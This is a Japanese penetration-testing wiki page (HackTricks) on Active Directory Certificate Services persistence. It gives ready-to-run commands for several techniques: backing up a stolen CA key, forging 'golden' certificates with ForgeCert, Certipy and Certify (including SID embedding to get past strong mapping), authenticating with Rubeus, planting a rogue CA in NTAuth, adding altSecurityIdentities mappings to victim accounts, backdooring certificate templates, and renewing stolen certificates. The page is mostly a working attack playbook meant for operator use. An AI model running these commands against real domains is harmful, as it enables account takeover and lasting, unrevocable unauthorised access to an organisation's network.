# AD CS ドメイン永続化

{{#include ../../../banners/hacktricks-training.md}}

**これは [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) に掲載されているドメイン永続化手法の要約です。** 詳細はそちらを参照してください。

## 盗まれた CA 証明書を使った証明書の偽造 (Golden Certificate) - DPERSIST1

その証明書が CA 証明書であるかどうかはどう判断しますか？

以下の条件が満たされている場合、その証明書は CA 証明書であると判断できます:

- 証明書は CA サーバー上に保存されており、その秘密鍵はマシンの DPAPI、または OS がサポートしている場合は TPM/HSM のようなハードウェアで保護されている。
- 証明書の Issuer と Subject フィールドの両方が CA の distinguished name と一致している。
- CA 証明書にのみ "CA Version" 拡張が存在している。
- 証明書に Extended Key Usage (EKU) フィールドが存在しない。

この証明書の秘密鍵を抽出するには、CA サーバー上で組み込みの GUI を介して `certsrv.msc` ツールを使用するのがサポートされた方法です。それでも、この証明書はシステム内に保存されている他の証明書と基本的に違いはないため、[THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) のような方法を用いて抽出することも可能です。

証明書と秘密鍵は、以下のコマンドで Certipy を使って取得することもできます:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA 証明書とその秘密鍵を `.pfx` 形式で取得したら、[ForgeCert](https://github.com/GhostPack/ForgeCert) のようなツールを使って有効な証明書を生成できます:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 証明書偽造の対象となるユーザーは、プロセスを成功させるために Active Directory 上でアクティブで認証可能でなければなりません。krbtgt のような特殊アカウントに対する証明書の偽造は効果がありません。

この偽造証明書は、指定された有効期限まで、かつ**ルート CA 証明書が有効な限り**（通常は5年から**10年以上**）**有効**です。これは**マシン**にも有効であるため、**S4U2Self** と組み合わせることで、攻撃者は CA 証明書が有効な限り **任意のドメインマシン上に永続化** できます。\
さらに、**この方法で生成された証明書**は CA が認識していないため **取り消すことができません**。

### 強力な証明書マッピング強制の下での運用 (2025+)

2025年2月11日以降（KB5014754 の展開後）、ドメインコントローラーは証明書マッピングに対してデフォルトで **Full Enforcement** を適用します。実務上、これは偽造した証明書がいずれかを満たす必要があることを意味します：

- ターゲットアカウントへの強いバインディングを含む（例えば、SID security extension）、または
- ターゲットオブジェクトの `altSecurityIdentities` 属性に強力で明示的なマッピングが設定されていること。

永続化の確実なアプローチは、盗んだ Enterprise CA にチェーンされた偽造証明書を作成し、続いて被害者プリンシパルに対して強力で明示的なマッピングを追加することです：
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
注意
- SID セキュリティ拡張を含む偽造証明書を作成できる場合、それらは Full Enforcement の下でも暗黙にマッピングされます。そうでない場合は、明示的な強いマッピングを優先してください。明示的なマッピングの詳細は [account-persistence](account-persistence.md) を参照してください。
- 失効は防御側に役立ちません: 偽造証明書は CA データベースに登録されていないため、失効させることができません。

#### Full-Enforcement compatible forging (SID-aware)

Updated tooling lets you embed the SID directly, keeping golden certificates usable even when DCs reject weak mappings:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SIDを埋め込むことで、監視されている可能性がある`altSecurityIdentities`に触れる必要を避けつつ、強力なマッピングチェックを満たせます。

## Trusting Rogue CA Certificates - DPERSIST2

`NTAuthCertificates` オブジェクトは、Active Directory (AD) が利用する `cacertificate` 属性に1つ以上の **CA certificates** を含むよう定義されています。**domain controller** による検証プロセスでは、認証対象の **certificate** の Issuer フィールドに指定された **CA specified** と一致するエントリが `NTAuthCertificates` オブジェクト内にあるかを確認します。一致が見つかれば認証は進行します。

攻撃者がこの AD オブジェクトを制御していれば、自己署名の CA 証明書を `NTAuthCertificates` オブジェクトに追加できます。通常、このオブジェクトを変更できるのは **Enterprise Admin** グループのメンバー、あるいは **forest root’s domain** の **Domain Admins** や **Administrators** のみです。`NTAuthCertificates` オブジェクトは `certutil.exe` を使って `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` のコマンドで編集するか、[**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) を使用して行えます。

この手法に役立つ追加のコマンド:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
この機能は、ForgeCert を用いて動的に証明書を生成する前述の手法と組み合わせた場合に特に関連性があります。

> Post-2025 のマッピングに関する考慮点: NTAuth に不正な CA を配置しても、発行元 CA のみが信頼されるようになります。DCs が **Full Enforcement** の場合にログオンに leaf certificate を使うには、leaf に SID セキュリティ拡張が含まれているか、対象オブジェクト上に強力な明示的マッピング（例えば Issuer+Serial を `altSecurityIdentities` に設定）が必要です。詳細は {{#ref}}account-persistence.md{{#endref}} を参照してください。

## Malicious Misconfiguration - DPERSIST3

AD CS コンポーネントの **security descriptor の変更** を通じた **persistence** の機会は多く存在します。"[Domain Escalation](domain-escalation.md)" セクションで説明されている変更は、ドメイン内で昇格した権限を持つ攻撃者によって悪用され得ます。これには、次のような重要なコンポーネントへの「コントロール権」（例: WriteOwner/WriteDACL/etc.）の追加が含まれます:

- **CA server’s AD computer** オブジェクト
- **CA server’s RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 内の任意の **子孫 AD オブジェクトやコンテナ**（例えば Certificate Templates コンテナ、Certification Authorities コンテナ、NTAuthCertificates オブジェクトなど）
- 組織やデフォルトで AD CS の制御権が委任されている **AD グループ**（例えば組み込みの Cert Publishers グループおよびそのメンバー）

悪意ある実装の例としては、ドメイン内で **昇格した権限** を持つ攻撃者が、デフォルトの **`User`** 証明書テンプレートに **`WriteOwner`** 権限を追加し、権利の主体を攻撃者自身にする、というものがあります。これを悪用するには、まず攻撃者が **`User`** テンプレートの所有者を自分に変更します。その後、テンプレート上で **`mspki-certificate-name-flag`** を **1** に設定して **`ENROLLEE_SUPPLIES_SUBJECT`** を有効化し、リクエストで Subject Alternative Name を申請者が提供できるようにします。次に、攻撃者はその **template** を使って **enroll** し、代替名として **domain administrator** の名前を選択し、取得した証明書を DA としての認証に利用できます。

長期的なドメイン persistence のために攻撃者が設定し得る実用的な項目（完全な詳細と検出については {{#ref}}domain-escalation.md{{#endref}} を参照）:

- リクエストから SAN を許可する CA ポリシーフラグ（例: `EDITF_ATTRIBUTESUBJECTALTNAME2` を有効化）。これにより ESC1 風の経路が悪用可能なままになります。
- 認証可能な発行を許すテンプレートの DACL や設定（例: Client Authentication EKU の追加、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` の有効化）。
- 防御側がクリーンアップを試みた場合に不正な発行元を継続的に再導入するための `NTAuthCertificates` オブジェクトや CA コンテナの制御。

> [!TIP]
> KB5014754 適用後のハードニングされた環境では、これらの誤設定を明示的な強いマッピング（`altSecurityIdentities`）と組み合わせることで、DCs が強いマッピングを強制している場合でも発行／偽造した証明書を引き続き利用可能にすることができます。

### Certificate renewal abuse (ESC14) for persistence

authentication-capable な証明書（または Enrollment Agent のもの）を侵害した場合、発行テンプレートが引き続き公開され、CA が発行元チェーンを信頼している限り、その証明書を**無期限に更新 (renew)** することが可能です。更新は元の識別バインディングを保持しつつ有効期間を延長するため、テンプレートが修正されるか CA が再公開されない限り追放が困難になります。
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
ドメインコントローラーが**Full Enforcement**にある場合、更新されたリーフ証明書が `altSecurityIdentities` に触れずに強いマッピングを維持するよう、`-sid <victim SID>` を追加する（またはSIDセキュリティ拡張を含むテンプレートを使用する）。CA管理者権限を持つ攻撃者は、自分で証明書を発行する前に更新後の有効期間を延長するために `policy\RenewalValidityPeriodUnits` を調整することもできます。

## 参考資料

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
